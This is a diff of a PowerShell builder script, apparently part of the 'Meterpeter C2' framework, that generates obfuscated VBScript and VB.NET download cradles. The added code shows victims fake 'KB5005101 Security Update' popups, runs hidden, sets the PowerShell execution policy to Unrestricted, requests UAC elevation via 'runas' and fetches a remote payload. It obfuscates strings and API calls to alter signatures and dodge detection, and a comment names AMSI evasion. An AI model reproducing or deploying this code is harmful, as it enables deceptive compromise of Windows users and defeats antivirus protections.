@@ -3,10 +3,10 @@
    Cmdlet to create Download_Crandle.vbs
 
    Author: @r00t-3xp10it
-   Tested Under: Windows 10 (19043) x64 bits
+   Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: @Meterpeter C2 v2.10.14
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.2.14
+   PS cmdlet Dev version: v1.2.15
 
 .DESCRIPTION
    Cmdlet to create download_crandle.vbs that allow @Meterpeter C2 v2.10.14
@@ -25,9 +25,7 @@
    creates Download_crandle.vbs without the UAC elevation function technic.
 
    Remark: The UAC elevation function spawns an UAC GUI to user at runtime
-   asking to run the application with 'administrator' token privileges and
-   It also adds 'Set-MpPreference -DisableScriptScanning 1' to the download
-   crandle if invoked together with -UACElevation 'true' argument declaration.
+   asking to run the application with 'administrator' token privileges.
 
    Remark: This cmdlet obfuscates crandle.vbs API's calls evertime thats
    executed to allow for crandle signature modify everytime its created.
@@ -146,13 +144,9 @@ If($Egg -ieq "false")
       Helper - Crandle Manual Build Function
 
    .NOTES
-      Crandle_Builder.ps1 its an auxiliary module of @Meterpeter C2 v2.10.11
+      Crandle_Builder.ps1 its an auxiliary module of @Meterpeter C2 v2.10.14
       that allow is users to created download crandles. But it can be manual
-      executed ( without @Meterpeter C2 v2.10.11 ) to create crandles localy.
-
-      Remark: python3 (http.server) its required to store\deliver payload.ps1
-      Remark: Download_Crandle.vbs + Payload.ps1 should be placed on http.server
-      working directory, and Download_Crandle.vbs script must be deliver to target.
+      executed ( without @Meterpeter C2 v2.10.14 ) to create crandles localy.
    #>
 
    #Get Local host adress to confing crandles (manual execution)
@@ -183,15 +177,16 @@ If($Action -ieq "download")
    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Creates download crandles (not fileless)
+      Helper - Creates download crandles (not-fileless)
 
    .NOTES
-      This function creates crandles with or without UAC elevation
+      This function creates crandles with or without [U]AC elevation
       function and auto-deletes the crandle downloader in the end.
    #>
 
 #Deobfuscating strings ( download technics ) at runtime
 $TechnicDefault_Tmp = $TechnicDefault_Tmp -replace '@!','w' -replace '#','e' -replace '&%','s'
+
 $UserLand = @("'
 ' Copyright (c) Microsoft Corporation.  All rights reserved.
 '
@@ -202,14 +197,17 @@ $UserLand = @("'
 
 '''''''''''''''''''''
 ' Vars
-dIm $Apii,Cmd,Layback
-$Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+dIm $Apii,Cmd,MicroStore,Restricted,visible
+$Apii = `"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
+Restricted = StrReverse(`"detcirtseRnU`")
+MicroStore = rEpLaCe($Apii, `"@!`", `"`")
+Cmd = rEpLaCe(MicroStore, `":007:`", `"`")
+visible = false
 
-set ObjSSLTerminal = CreateObject(`"Wscript.Shell`")
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
-ObjSSLTerminal.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
-ObjSSLTerminal.Run(`"$TechnicDefault_Tmp`"), 0
+'''''''''''''''''''''
+' HELP - GENERAL
+CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES, LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 4, `"KB5005101 21H1 - Securit Update`", 1
+CreateObject(`"Wscript.Shell`").run `"cmd /R echo Y\|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser && $TechnicDefault_Tmp`", visible
 WScript.Quit")
 
 
@@ -223,25 +221,21 @@ $AutoElevation = @("'
 
 '''''''''''''''''''''
 ' Vars
-dIm $gUid,CookieAuth,AuthToken,$Apii,Cmd,Layback
-AuthToken = WScript.FullName:$gUid = StrReverse(`"sanur`")
+dIm $gUid,Cookie_AuthKey,SSLToken,$Apii,Cmd,MicroStore
 $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-Layback=rEpLaCe($Apii, `"@!`", `"`"):Wscript.Sleep(500)
-set SSLProvider = CreateObject(`"Wscript.Shell`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
+SSLToken = WScript.FullName:Cookie_AuthKey = WScript.ScriptFullName
+MicroStore = rEpLaCe($Apii, `"@!`", `"`"):$gUid = StrReverse(`"sanur`")
+Cmd = rEpLaCe(MicroStore, `":007:`", `"`"):visible = false
 
-If WScript.Arguments.length = 0 Then
-   CookieAuth = WScript.ScriptFullName
-   Set ObjTerminal = CreateObject(`"Shell.Application`"):Wscript.Sleep($TokenAuth)
-   ObjTerminal.ShellExecute AuthToken, Chr(34) & CookieAuth & Chr(34) & `" /debug`", `"`", $gUid
+If WScript.Arguments.length = visible Then
+   CreateObject(`"Shell.Application`").ShellExecute SSLToken, Chr(34) & Cookie_AuthKey & Chr(34) & `" /help`", `"`", $gUid
    WScript.Quit
 End If
 
 '''''''''''''''''''''
 ' HELP - GENERAL
-CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
-
-SSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`")
-SSLProvider.Run(`"$TechnicDefault_Tmp`"), 0
+CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES, LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 4, `"KB5005101 21H1 - Security Update`", 1
+CreateObject(`"wscript.shell`").run `" cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && $TechnicDefault_Tmp`", visible
 WScript.Quit")
 
 
@@ -260,6 +254,7 @@ dIm $Apii,Cmd,Layback
 $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
 Layback=rEpLaCe($Apii, `"@!`", `"`"):Cmd=rEpLaCe(Layback, `":007:`", `"`")
 set ObjConsole = CreateObject(`"Wscript.Shell`")
+CreateObject(`"wscript.shell`").popup `"Windows servicing stack update - 19041.1161, 19042.1161, and 19043.1161 This update makes quality improvements to the servicing stack, which is the component that installs Windows updates. Servicing stack updates (SSU) ensure that you have a robust and reliable servicing stack so that your devices can receive and install Microsoft updates.`", 3, `"KB5005101 21H1 Security Update`", 1
 CreateObject(`"wscript.shell`").popup `"THIS SOFTWARE IS PROVIDED BY THE REGENTS AND`" & vbcrlf & `"CONTRIBUTORS AS IS AND ANY EXPRESS OR IMPLIED`" & vbcrlf & `"WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE`" & vbcrlf & `"IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES ; LOSS OF USE, DATA, OR PROFITS, BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY IN WHETHER THE CONTRACT, STRICT LIABILITY, OR TORTCH (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`", 5, `"KB5005101 21H1 Update`", 64
 ObjConsole.Run(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser`"), 0
 ObjConsole.Run(`"$TechnicDefault_Tmp`"), 0
@@ -411,7 +406,8 @@ Set objFolder = objFSO.GetFolder(objStartFolder)
 Set colFiles = objFolder.Files
 For Each objFile in colFiles
     ObjMicrosoftDisclamer.Exec(`"$CrandleCmdLine`")
-Next")
+Next
+WScript.Quit")
 #>
 
 
@@ -475,23 +471,22 @@ Else
 }
 
 
+## TODO: Inte`ropSer`vices = [a]msi
+# use vbsencoder.vbs on this template [meterpeter] ???
+$VbsCoder = "@S£y£'st@e£m.@R£'u£nt'@i£me.I@n't£e@ro£pS'@er£v£'ic@es" -replace '(@|£|'')',''
 $VBStoExe = @("Imports System
-Imports System.Runtime.InteropServices
+Imports $VbsCoder
 Public Module Whatever
 
 Sub Main
    Dim SSLProvider As Object
-   SSLProvider = CreateObject(`"Wscript.Shell`")
+   ObjSSLProvider = CreateObject(`"Wscript.Shell`")
 
    dIm $Apii,Cmd,Layback,Restricted,ttl,InvokeMe
    $Apii=`"@!COLOMBO@!`"+`":007:VIRIATO@!`"+`"NAVIGATOR@!`"
-   ttl=`"I@`":InvokeMe=rEpLaCe(ttl, `"@`", `"EX`")
-   Layback=rEpLaCe($Apii, `"@!`", `"`")
-   Cmd=rEpLaCe(Layback, `":007:`", `"`")
-
-   Restricted=`"UnRestricted`"
-   SSLProvider.Exec(`"cmd /R echo Y\|Powershell Set-ExecutionPolicy `"+Restricted+`" -Scope CurrentUser`")
-   SSLProvider.Run(`"$CrandleCmdLine`")
+   ttl = `"I@`":InvokeMe = rEpLaCe(ttl, `"@`", `"EX`"):visible = false
+   Layback = rEpLaCe($Apii, `"@!`", `"`"):Cmd = rEpLaCe(Layback, `":007:`", `"`")
+   ObjSSLProvider.run `"cmd /R echo Y\|Powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser && $CrandleCmdLine`", visible
 end sub
 End Module")
 
